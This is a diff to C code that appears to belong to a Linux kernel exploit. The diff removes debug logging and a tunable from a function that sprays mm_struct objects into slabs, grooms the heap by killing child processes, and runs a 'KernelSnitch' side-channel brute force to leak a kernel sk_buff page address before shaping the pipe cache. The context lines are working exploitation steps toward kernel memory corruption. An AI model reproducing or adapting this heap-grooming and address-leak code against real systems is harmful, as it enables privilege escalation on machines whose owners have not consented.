@@ -67,17 +67,12 @@ uintptr_t prepare_pipe_buffer_page_child(void) {
   struct mm_ctx pre;
   struct mm_ctx post;
   size_t objs_per_slab = ORDER3_SIZE / MM_STRUCT_SZ;
-  int prep_slabs = env_int_range("GL_PIPE_PREP_SLABS", 32, 8, 32);
 
-  init_ctx(&prep, (size_t)prep_slabs * objs_per_slab);
+  init_ctx(&prep, 32 * objs_per_slab);
   init_ctx(&spray, (1 + MM_PARTIALS) * objs_per_slab);
   init_ctx(&pre, objs_per_slab - 1);
   init_ctx(&post, objs_per_slab);
 
-  pr_info("pipe reclaim: prep_slabs=%d prep=%zu spray=%zu pre=%zu post=%zu\n",
-          prep_slabs, prep.mm_cnt, spray.mm_cnt, pre.mm_cnt, post.mm_cnt);
-
-  pr_info("pipe reclaim: preparing mm objects\n");
   for (size_t i = 0; i < prep.mm_cnt; i++) {
     prep.childs[i] = -1;
     prep.memfds[i] = clone_memfd();
@@ -87,7 +82,6 @@ uintptr_t prepare_pipe_buffer_page_child(void) {
     spray.memfds[i] = clone_memfd();
   }
 
-  pr_info("pipe reclaim: setting up KernelSnitch\n");
   setup_kernelsnitch();
 
   for (size_t i = 0; i < pre.mm_cnt; i++) {
@@ -101,7 +95,6 @@ uintptr_t prepare_pipe_buffer_page_child(void) {
   }
   int leak_memfd = open_memfd(leak_child);
 
-  pr_info("pipe reclaim: releasing shaped mm objects\n");
   for (size_t i = 0; i < pre.mm_cnt; i++) {
     kill_child(pre.childs[i]);
   }
@@ -161,14 +154,12 @@ uintptr_t prepare_pipe_buffer_page_child(void) {
   SYSCHK(close(leak_memfd));
   SYSCHK(sendmsg(skb_sv[0], &msg, 0));
 
-  pr_info("pipe reclaim: running KernelSnitch brute force\n");
   run_kernelsnitch_bruteforce();
   uintptr_t leaked = cleanup_kernelsnitch();
   if (leaked == (uintptr_t)-1) {
     pr_error("pipe KernelSnitch sk_buff page leak failed\n");
   }
   uintptr_t base = leaked & ~(ORDER3_SIZE - 1);
-  pr_info("pipe reclaim: leaked=%016zx base=%016zx\n", leaked, base);
 
   shape_pipe_cache();
 
